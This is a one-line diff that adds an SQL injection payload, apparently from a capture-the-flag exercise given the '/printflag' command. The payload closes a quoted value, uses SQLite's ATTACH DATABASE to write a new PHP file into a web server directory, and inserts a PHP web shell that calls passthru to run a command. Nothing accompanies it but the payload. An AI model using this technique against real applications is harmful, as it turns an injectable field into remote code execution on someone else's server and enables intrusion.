@@ -1,0 +1,1 @@
+waw'); ATTACH DATABASE '/var/www/html/abyss/chicken.php' AS g; CREATE TABLE IF NOT EXISTS g.a (x string); INSERT INTO g.a VALUES ('<?php passthru("/printflag"); ?>'); -- 
